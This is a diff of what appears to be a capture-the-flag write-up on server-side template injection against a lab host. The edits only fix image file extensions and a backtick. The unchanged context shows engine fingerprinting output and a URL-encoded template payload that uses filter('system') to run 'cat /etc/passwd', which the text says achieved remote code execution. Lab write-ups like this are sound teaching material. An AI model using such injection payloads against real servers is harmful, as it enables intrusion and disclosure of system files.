@@ -1054,7 +1054,7 @@ The result remains:
 {"id": "49", "location": "134 Main Street"}
 ```
 
-![Filtered output](images/exploitation7.PNG)
+![Filtered output](images/exploitation7.png)
 
 This behavior allows us to distinguish between common engines:
 
@@ -1075,7 +1075,7 @@ The server responds with internal template metadata:
 {"id": "__string_template__0177c07c1ce875b2c81f5871e3da1c28", "location": "134 Main Street"}
 ```
 
-![Filtered output](images/exploitation8.PNG)
+![Filtered output](images/exploitation8.png)
 
 This confirms the presence of an exploitable SSTI vulnerability.
 
@@ -1099,6 +1099,6 @@ This error is likely caused by improper handling of special characters, particul
 api=http://truckapi.htb/?id%3D{{%2b['cat%2b/etc/passwd']%2b|%2bfilter('system')%2b}}
 ```
 
-This time, the payload executes successfully, resulting in remote code execution and disclosure of `/etc/passwd´:
+This time, the payload executes successfully, resulting in remote code execution and disclosure of `/etc/passwd`:
 
-![Filtered output](images/exploitation10.PNG)
+![Filtered output](images/exploitation10.png)
